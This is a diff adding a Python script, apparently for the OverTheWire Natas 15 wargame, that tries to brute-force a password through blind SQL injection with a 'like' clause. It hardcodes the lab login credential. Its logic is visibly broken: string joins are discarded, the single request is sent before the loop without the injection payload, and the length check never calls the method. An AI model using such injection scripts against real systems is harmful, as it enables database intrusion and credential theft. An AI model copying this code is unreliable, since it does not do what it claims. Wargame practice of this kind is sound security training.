@@ -1,0 +1,25 @@
+import requests
+import string
+
+password = "w"
+inject = "natas16%22%20and%20password%20like%20%22"+password+"%"
+payload = {'temp':'y','username': inject}
+request = requests.get('http://natas15.natas.labs.overthewire.org/',
+auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
+good = "This user exists."
+bad = "This user doesn't exist."
+ugly = "Error in query."
+request_str = "test"
+chars = string.ascii_letters + string.digits
+
+for letter in chars:
+    password.join(letter)
+    request.content
+    request
+    if request.text == good:
+        password.join
+    if request.text == bad:
+        print("Bad Password"+password)
+    if password.__len__ == 32:
+        break
+print(password)
